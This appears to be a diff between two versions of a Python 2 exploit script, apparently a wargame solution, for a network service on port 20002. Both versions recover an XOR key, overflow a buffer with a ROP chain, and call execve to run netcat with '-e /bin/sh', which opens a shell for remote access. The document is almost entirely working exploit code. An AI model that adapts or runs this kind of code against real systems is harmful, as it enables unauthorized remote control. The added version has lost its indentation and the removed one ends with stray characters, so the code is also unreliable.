@@ -1,86 +1,70 @@
-#! /usr/bin/env python
-import socket
-from time import sleep
-from struct import pack
+# -*- coding: utf-8 -*-
+import socket, time
+from struct import pack, unpack
 
-def encrypt(text, key, keysize):
-    return "".join([chr(ord(x) ^ ord(key[ i % keysize])) for i, x in enumerate(text)])
+JUNK=0xdeadbabe
+OVERFLOW=0x10
+overflowedSize=0x20000+OVERFLOW
+blocksize=128
+links=[
+0x804952d, # &nread
+0x8048815, # add esp, 8; pop ebx; ret
+1,         # nread(1,
+0x804b464, #       &buffer,
+20,        #       size)
+0x804952d, # &nread
+0x8048815, # add esp, 8; pop ebx; ret
+1,         # nread(1,
+0x804b42c, #       &buffer,
+13,        #       size)
+0x80489b0, # &(execve@plt)
+JUNK,
+0x804b471, # &"/bin/nc"
+0x804b42d, # &argv
+0          # no envp
+]
+chain=''.join(pack('I', link) for link in links)
+PAYLOAD='E'+pack('I', blocksize)+"\x00"*blocksize
+KEYBUF=[]
 
-def xorstr(a, b):
-    if len(a) > len(b):
-        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
-    else:
-        return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])
+def cipher(message, length):
+global KEYBUF
+cipherd = []
+for i in xrange(0, length, 4):
+cipherd.append(unpack('I', message[i:i+4])[0]^KEYBUF[(i/4)%32])
+return cipherd
 
-# Connect to target and receive 1st message.
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.25.2", 20002))
-sleep(0.5)
-s.recv(1024)
+def main():
+global overflowedSize, blocksize, PAYLOAD, KEYBUF, chain
 
-# Send dummy data and extract key from response.
-keysize = 128
-dummy = "A"*keysize
-s.send("E")
-s.send(pack("<L", keysize))
-s.send(dummy)
-s.recv(2048)
-temp = s.recv(2048)
-encrypted = temp[-keysize:]
-key = xorstr(dummy, encrypted)
+# Create connection & Send initial payload ??
+s = socket.create_connection(("127.0.0.1", 20002))
+s.sendall(PAYLOAD)
 
-# Test to detect any issues.
-if len(key) != keysize or key.find("encryption") != -1:
-    print "Key extraction fail."
-    exit(1)
+# Flush some garbage down the toilet (177 ascii + 4 size)
+s.recv(181, socket.MSG_WAITALL)
 
-################ Exploit starts here. ##################
-base = 0x0804b420 # Base of new frame.
-junk = "A"*0x20010
-bss = pack("<L", base)
-nread = pack("<L", 0x0804952d)
-fd = pack("<L", 0)
-size = pack("<L", 100)
-popebp = pack("<L", 0x08048b13)
-ebp = bss
-leaveret = pack("<L", 0x08048b41)
-# pop ebp (.bss); nread(fd, @bss, size); leave (.bss) + ret (.bss+4)
-stage0 = popebp + ebp + nread + leaveret + fd + bss + size
-payload1 = junk + stage0
+# retrieve the key, hashtag 1337cr4ck3r
+key=s.recv(128, socket.MSG_WAITALL)
+KEYBUF=[unpack('I',key[i:i+4])[0] for i in xrange(0, 128, 4)]
 
-# Send Stage0 payload
-cipher1 = encrypt(payload1, key, keysize)
-s.send("E")
-s.send(pack("<L", len(cipher1)))
-s.send(cipher1)
-print "stage0 SENT"
-sleep(0.5)
+# Create a ciphered block of payload
+payload='A'*(overflowedSize)+chain
+ENCRYPTED_PAYLOAD='E'+pack('I', overflowedSize+len(chain))
+ENCRYPTED_PAYLOAD+=''.join(pack('I', x) for x in cipher(payload, len(payload))) # <- EZ
 
-# Clean socket.
-s.recv(0xffffff)
-s.send("Q")
-sleep(0.5)
+# Vamos ala explotar!
+s.sendall(ENCRYPTED_PAYLOAD+"Q")
+# Wait for our payload to process
+time.sleep(0.5)
+# send some strings with relevant binaries and arguments
+s.sendall('/bin/sh\x00-lne\x00/bin/nc\x00')
+# Cool people are late to the party
+time.sleep(0.5)
+# send argv pointers
+s.sendall(pack('I', 0x804b471)+pack('I', 0x804b46c)+pack('I',0x804b464))
+# All is well, Sayonara.
+s.close()
+return 0
 
-# Stage1.
-null = pack("<L", 0x0) # Null pointer
-filler = "DDDD" # placeholder junk.
-execve = pack("<L", 0x080489b0) # execve@plt to launch backdoor.
-exit = pack("<L", 0x08048960) # exit@plt for a graceful exit.
-args = pack("<L", base + 24) # 2nd arg for execve() {"/bin/nc", "-lp6667", "-e/bin/sh", NULL}
-envp = null # Third argument  for execve()
-
-data_offset = 40 # filler + @execve + @exit + 3 execve args + args[4] == 40
-# execve() arguments
-binnc = pack("<L", base + data_offset)
-ncarg1 = pack("<L", base + data_offset + 8) # -ltp6667 is 8 bytes after binnc
-ncarg2 = pack("<L", base + data_offset + 17) # -e/bin/sh is 17 bytes after binnc
-
-
-# Send Stage2 payload.
-stage1 = filler + execve + exit + binnc + args + envp
-stage1 += binnc + ncarg1 + ncarg2 + null
-stage1 += "/bin/nc\x00" + "-ltp6667\x00" + "-e/bin/sh\x00"
-junk = "E" * (100 - len(stage1))
-s.send(stage1+junk)
-print "stage1 SENT"
-s.close()ss
+exit(main())
